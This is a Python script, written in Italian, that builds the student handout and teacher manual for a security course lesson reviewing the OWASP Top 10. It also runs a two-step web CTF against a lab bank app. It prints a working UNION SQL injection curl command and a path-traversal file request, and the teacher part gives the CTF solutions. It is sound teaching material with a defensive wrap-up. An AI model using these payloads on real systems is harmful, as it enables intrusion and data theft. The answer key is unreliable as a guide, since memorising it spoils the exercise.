# -*- coding: utf-8 -*-
import comune
NUM = 18
SLUG = "owasp-top10-ctf-web"
TITOLO = "Ripasso OWASP Top 10 e mini CTF web"


def dispensa(d):
    d.box("blu", "In breve", [
        "**Durata:** 2 ore.  Struttura: 20 min ripasso · 85 min CTF · 15 min difesa.",
        "**Obiettivo:** mettere in fila tutto il blocco web con la mappa OWASP Top 10 e "
        "affrontare un mini CTF a catena, dove il risultato di un attacco serve al "
        "successivo.",
        "**Al termine sai:** riconoscere le grandi categorie di vulnerabilità web e "
        "concatenare due tecniche (SQL injection e LFI) per raggiungere un obiettivo.",
        "**Flag in palio:** 2 flag della sfida (70 punti) + il ripasso dei colpi del blocco.",
    ])

    d.h1("Parte 1 · La mappa: OWASP Top 10 (20 min)")
    d.p("OWASP è un'organizzazione che pubblica la Top 10, la classifica delle "
        "vulnerabilità web più diffuse e gravi. Tutto quello che hai fatto nel blocco "
        "rientra in queste categorie: ecco la mappa.")
    d.table(["Categoria OWASP", "Cosa hai fatto nel corso", "Lezione"], [
        ["A01 Broken Access Control", "cookie forgiato, pannello admin, LFI", "15, 17"],
        ["A03 Injection", "SQL injection (login, dump, UNION), sqlmap", "12, 13"],
        ["A07 Auth Failures", "brute force, password deboli, sessioni prevedibili", "15, 16"],
        ["A03 XSS (Injection)", "XSS riflesso e memorizzato", "14"],
        ["A05 Misconfiguration", "footprint, header, directory listing, upload", "7, 17"],
    ], widths=[2800, 4226, 2000])

    d.h1("Parte 2 · Mini CTF: svuota il caveau (pratica, 85 min)")
    d.p("Sul bersaglio serve la Banca (Lezione 12), poi `lab 18`. La sfida ha due passi: "
        "il primo ti dà l'informazione che serve al secondo. È così che lavorano gli "
        "attacchi reali: una catena, non un colpo solo.")

    d.h2("Sfida 1 · Trova il caveau con la SQL injection (+30)")
    d.p("Usa la ricerca vulnerabile e la UNION per leggere la tabella dei segreti: c'è "
        "una riga 'caveau' con la prima flag e il percorso del file da aprire.")
    d.code([
        "curl \"http://10.10.10.20:8080/cerca?conto=' UNION SELECT chiave,valore,'x' FROM segreti -- \"",
    ])
    d.p("Annota il percorso del caveau (qualcosa come `../segreti/vault_xxxx.txt`).")

    d.h2("Sfida 2 · Apri il caveau con il path traversal (+40)")
    d.p("Usa il percorso trovato nella pagina documenti (LFI).")
    d.code([
        "curl \"http://10.10.10.20:8080/documenti?file=../segreti/vault_xxxx.txt\"",
        "# sostituisci vault_xxxx.txt con il nome che hai letto nella Sfida 1",
    ])
    d.p("Dentro il caveau c'è la seconda flag: hai concatenato SQL injection e LFI.")

    d.box("blu", "Ripasso libero (gara del blocco)", intro=(
        "Se hai tempo, rifai in autonomia i colpi del blocco e somma i punti:"), items=[
        "Login bypass e dump (SQLi), dump automatico con sqlmap.",
        "XSS riflesso e memorizzato.",
        "Furto di sessione col cookie forgiato; pannello admin.",
        "Brute force del login debole; blocco su quello forte.",
        "LFI e upload non validato.",
    ])

    d.h1("Parte 3 · Ribaltamento difensivo (15 min)")
    d.p("Un attacco a catena si spezza chiudendo anche un solo anello. Se la SQL "
        "injection fosse chiusa (query parametrizzate), la Sfida 1 fallirebbe e il caveau "
        "resterebbe segreto. Se l'LFI fosse chiusa (whitelist dei file), la Sfida 2 "
        "fallirebbe anche conoscendo il percorso.")
    d.box("verde", "La difesa è a strati", items=[
        "Ogni vulnerabilità chiusa toglie un anello alla catena dell'attaccante.",
        "Difesa in profondità: input validato, query parametrizzate, output escappato, "
        "accessi controllati lato server, permessi minimi.",
        "Aggiornamenti e monitoraggio: molte falle note si chiudono solo aggiornando.",
    ])
    comune.studio(
        d,
        approfondimenti=[
            ('La OWASP Top 10 in breve', "La Top 10 di OWASP è l'elenco, aggiornato ogni pochi anni, delle categorie di falle web più diffuse e gravi. Tra le principali: Broken Access Control (chi può fare cosa, gestito male), Cryptographic Failures (dati sensibili non protetti), Injection (SQLi, XSS e simili), Insecure Design (falle di progettazione), Security Misconfiguration (configurazioni sbagliate), Vulnerable Components (librerie vecchie), Identification and Authentication Failures (login e sessioni deboli). Non è una lista di 'bug' ma di famiglie: serve a ragionare per categorie e a non dimenticare interi fronti. Il valore del mini CTF di oggi è vedere come, nella pratica, un attacco reale ne combina più di una in sequenza."),
        ],
        sintesi=[
            "OWASP pubblica la Top 10: la classifica delle vulnerabilità web più diffuse e gravi.",
            'Tutto il blocco rientra in poche categorie: Injection (SQLi, XSS), Broken Access Control, Auth Failures, Misconfiguration.',
            'Gli attacchi reali sono a catena: il risultato di uno serve al successivo (SQLi -> LFI).',
            "La difesa è a strati: basta chiudere un anello per spezzare la catena.",
            "Difesa in profondità: input validato, query parametrizzate, output escappato, accessi lato server, permessi minimi.",
        ],
        glossario=[
            ('OWASP', "organizzazione che pubblica la Top 10 delle vulnerabilità web"),
            ('Top 10', "la classifica delle falle web più comuni e pericolose"),
            ('Attacco a catena', "concatenare più vulnerabilità per un obiettivo"),
            ("Difesa in profondità", "più strati di protezione, così se uno cede reggono gli altri"),
            ('CTF', 'Capture The Flag: gara a sfide di sicurezza, ogni flag vale punti'),
        ],
        errori=[
            "Pensare che chiudere una sola falla basti: gli attacchi combinano più errori.",
            "Trascurare la 'noiosa' configurazione: molte compromissioni nascono da lì.",
            "Non validare l'input e non escappare l'output insieme.",
        ],
        domande=[
            'Cita tre categorie OWASP e un attacco del corso per ognuna.',
            "Cosa vuol dire attacco 'a catena'? Fai l'esempio del caveau.",
            "Perché basta chiudere un anello per fermare una catena?",
            "Cos'è la difesa in profondità?",
        ],
        collegamenti=[
            'Lezioni 12-17: le singole falle che qui si combinano.',
            'Lezione 39: il CTF finale, che riprende queste tecniche.',
            'Lezione 27 e 35: le difese lato server e di rete.',
        ],
    )


    d.h2("Punteggio della Lezione 18")
    d.table(["Obiettivo", "Come", "Punti"], [
        ["Sfida 1 (SQLi)", "UNION sulla tabella segreti", "30"],
        ["Sfida 2 (LFI)", "aprire il file del caveau", "40"],
    ], widths=[4000, 3526, 1500])


def manuale(d):
    d.box("blu", "Scheda docente", [
        "**Lezione 18** · OWASP Top 10 e mini CTF web (Blocco 4, chiusura).",
        "**Tempi:** 20 min ripasso · 85 min CTF · 15 min difesa.",
        "**Prerequisiti:** Banca installata (Lezione 12); utile aver svolto L13 e L17.",
        "**Deliverable studente:** 2 flag della sfida (70 punti) + ripasso.",
    ])
    d.h1("Obiettivi didattici")
    d.bullets([
        "Consolidare il blocco con la mappa OWASP Top 10.",
        "Far sperimentare un attacco a catena (SQLi -> LFI).",
        "Rafforzare l'idea di difesa a strati: basta chiudere un anello.",
    ])
    d.h1("Come funziona il lab")
    d.bullets([
        "target.sh: verifica la Banca, aggiunge FLAG_CTF1 e FLAG_CTF2 e un nome di file "
        "caveau casuale (CTF_VAULT) a flags.env; scrive il file del caveau in "
        "`/opt/lab/banca-app/segreti/` e inserisce nella tabella `segreti` la riga "
        "'caveau' con il percorso relativo e FLAG_CTF1.",
        "La catena: la SQLi (UNION su segreti) rivela il percorso e FLAG_CTF1; l'LFI su "
        "quel percorso rivela FLAG_CTF2.",
    ])
    d.h1("Soluzioni e valori delle flag")
    d.p("Valori a runtime: `sudo cat /opt/lab/banca-app/flags.env` (vedi anche CTF_VAULT "
        "per il nome del file del caveau).")
    d.table(["Sfida", "Soluzione", "Variabile flag"], [
        ["1", "/cerca?conto=' UNION SELECT chiave,valore,'x' FROM segreti -- ", "FLAG_CTF1"],
        ["2", "/documenti?file=../segreti/<CTF_VAULT>", "FLAG_CTF2"],
    ], widths=[900, 5626, 2500])
    d.h1("Suggerimenti per la conduzione")
    d.bullets([
        "Tenere un tabellone dei punteggi: rende il CTF più coinvolgente.",
        "Chi finisce presto: assegnare il ripasso libero del blocco (tutti i vecchi colpi).",
        "Per una gara pulita, `banca-ctl reset` prima di iniziare azzera bacheca e dati "
        "(le flag restano stabili).",
    ])
    d.h1("Troubleshooting")
    d.table(["Sintomo", "Causa e rimedio"], [
        ["la riga caveau non compare", "rilanciare `lab 18` (reinserisce la riga)"],
        ["l'LFI non apre il vault", "usare il nome esatto letto nella Sfida 1; controllare "
         "`sudo cat /opt/lab/banca-app/flags.env` (CTF_VAULT)"],
        ["un reset ha tolto la sfida", "rilanciare `lab 18` dopo il reset"],
    ], widths=[2800, 6226])
    d.h1("Nota didattica")
    d.p("Chiude il Blocco 4. Il valore della lezione è il concatenamento: gli studenti "
        "capiscono che un attacco reale unisce più falle. Utile come prova intermedia di "
        "valutazione del blocco web.")
